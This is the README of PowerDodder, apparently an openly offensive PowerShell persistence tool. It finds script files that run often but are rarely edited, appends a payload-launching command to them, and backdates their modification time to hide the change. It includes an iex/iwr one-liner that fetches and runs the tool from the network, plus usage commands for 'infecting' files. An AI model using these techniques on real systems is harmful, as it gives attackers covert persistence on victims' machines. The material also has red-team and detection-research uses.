# Dodder

**PowerDodder** is a post-exploitation persistence utility designed to stealthily embed execution commands into existing script files on the host. By leveraging files that are frequently accessed but rarely modified, it targets high-likelihood execution vectors with minimal detection risk.

## 🧠 Background

Traditional persistence methods (e.g., Registry `Run` keys, scheduled tasks) are often monitored or flagged by EDRs and blue teams. **Dodder** takes a novel approach:

- It hunts for existing script files on disk (`.ps1`, `.bat`,`.cmd`, `.vbs`, `.js`).
- It prioritizes those that:
  - **Have been accessed recently** (indicating they're being executed often).
  - **Haven’t been modified recently** (suggesting they're not actively edited).
- It lets you choose the target script(s), and then it appends a payload-spawning command using a context-appropriate syntax (PowerShell, VBScript, JScript, etc.).

This allows for low-noise persistence, hitching a ride on legitimate execution paths.

## 🛠️ Usage

### 1. Load the script

```
iex (iwr https://raw.githubusercontent.com/itaymigdal/PowerDodder/refs/heads/main/PowerDodder.ps1) 
```

### 2. Run a Hunt

Scans predefined folders (`C:\Users\`, `C:\Program Files\`, `C:\Program Files (x86)\`,`C:\ProgramData\`) for promising script files.
```
DodderHunt
```
You can also target a specific folder:
```
DodderHunt -FolderPath "C:\CustomPath"
```
**Optional params:**

-LastAccessTimeThreshold: default is 7 days.

-LastModifyTimeThreshold: default is 3 months.

You can set different thresholds like that:
```
$DifferentModifyThreshold = (get-date).AddMonths(-4)
$DifferentAccessThreshold = (get-date).AddDays(-20)
DodderHunt -LastAccessTimeThreshold $DifferentAccessThreshold -LastModifyTimeThreshold $DifferentModifyThreshold
```

### 3. Infect a script
```
DodderInfect -ID <CandidateID> -PersistCommand <ExecutionCommand>
```
This will:
- Create the appended line of your command based on the relevant template.
- Modify the file by appending the persistence command.
- Restore the original script LastWriteTime attribute to hide the modification.
- Move the infected script to the Infected list.

### 4. Helpers

- DodderShow: Lists found candidates and already-infected files.
- DodderClearCandidates: Empties the current candidates list (useful before rescanning).


## 📚 Name Origin
The name Dodder comes from a parasitic vine that attaches itself to host plants, slowly feeding off them without killing them — much like this tool latches onto host scripts for persistent execution.

